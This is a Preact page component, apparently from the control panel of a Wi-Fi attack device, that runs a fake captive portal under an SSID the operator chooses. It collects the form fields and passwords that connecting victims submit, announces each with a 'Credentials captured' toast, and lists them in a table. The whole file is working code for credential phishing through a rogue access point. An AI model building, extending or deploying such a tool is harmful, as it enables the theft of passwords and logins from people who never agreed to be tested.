import { useEffect, useState } from 'preact/hooks';
import { Layout } from '../components/Layout';
import { PortalPicker } from '../components/PortalPicker';
import { api } from '../api';
import { showToast } from '../components/Toast';
import { wsAddListener } from '../ws';

function parseFormFields(data) {
  return String(data || '')
    .split('&')
    .map((pair) => {
      const idx = pair.indexOf('=');
      if (idx < 0) return { key: pair, value: '' };
      return {
        key: decodeURIComponent(pair.slice(0, idx).replace(/\+/g, ' ')),
        value: decodeURIComponent(pair.slice(idx + 1).replace(/\+/g, ' ')),
      };
    })
    .filter((f) => f.key);
}

export function Portal() {
  const [running, setRunning] = useState(false);
  const [ssid, setSsid] = useState('');
  const [portalSelected, setPortalSelected] = useState(false);
  const [passwords, setPasswords] = useState([]);

  useEffect(() => wsAddListener((msg) => {
    if (msg.type === 'attack_started' && msg.attack === 'portal') setRunning(true);
    if (msg.type === 'attack_stopped') setRunning(false);
    if (msg.type === 'portal_data') {
      const fields = parseFormFields(msg.data);
      const summary = fields.map((f) => `${f.key}=${f.value}`).join('  ');
      setPasswords((prev) => [
        { id: `${Date.now()}-${Math.random().toString(16).slice(2, 6)}`, fields, summary, time: new Date().toLocaleTimeString() },
        ...prev,
      ]);
      showToast(`Credentials captured: ${summary}`, 'success');
    }
    if (msg.type === 'password_received') {
      setPasswords((prev) => [
        { id: `${Date.now()}-${Math.random().toString(16).slice(2, 6)}`, fields: [{ key: 'password', value: msg.password }], summary: msg.password, time: new Date().toLocaleTimeString() },
        ...prev,
      ]);
      showToast(`Password captured: ${msg.password}`, 'success');
    }
  }), []);

  async function start() {
    const trimmed = ssid.trim();
    if (!trimmed) {
      showToast('SSID is required', 'warning');
      return;
    }
    if (!portalSelected) {
      showToast('Select a portal template', 'warning');
      return;
    }

    const res = await api.portal(trimmed);
    if (res.ok) {
      setRunning(true);
      showToast('Portal started', 'success');
    } else {
      showToast(res.error || 'Failed to start portal', 'error');
    }
  }

  async function stop() {
    await api.stop();
    setRunning(false);
    showToast('Stopped', 'warning');
  }

  return (
    <Layout
      title="Portal"
      subtitle="Open captive portal with your own SSID and selected HTML template."
      back="/global"
    >
      <section class="glass-card card-body reveal">
        {!running ? (
          <>
            <div class="field">
              <label class="field-label">Portal SSID</label>
              <input
                class="input"
                type="text"
                maxLength={32}
                value={ssid}
                onInput={(e) => setSsid(e.target.value)}
                placeholder="FreeWiFi"
              />
            </div>

            <PortalPicker onSelect={(idx) => setPortalSelected(idx > 0)} />
          </>
        ) : null}

        <div class="btn-row">
          {!running ? (
            <button class="btn btn-primary" onClick={start} disabled={!portalSelected || !ssid.trim()}>
              Start Portal
            </button>
          ) : (
            <button class="btn btn-danger" onClick={stop}>
              Stop Portal
            </button>
          )}
        </div>
      </section>

      {passwords.length > 0 ? (
        <section class="glass-card card-body reveal">
          <div class="section-head">
            <h3 class="section-title">Captured Credentials</h3>
            <span class="badge ok">{passwords.length}</span>
          </div>
          <div class="table-wrap">
            <table class="table">
              <thead><tr><th>Time</th><th>Submitted data</th></tr></thead>
              <tbody>
                {passwords.map((pw) => (
                  <tr key={pw.id}>
                    <td>{pw.time}</td>
                    <td>
                      {(pw.fields && pw.fields.length) ? pw.fields.map((f) => (
                        <div key={f.key}><span class="kv-key">{f.key}:</span> {f.value}</div>
                      )) : pw.summary}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      ) : null}
    </Layout>
  );
}
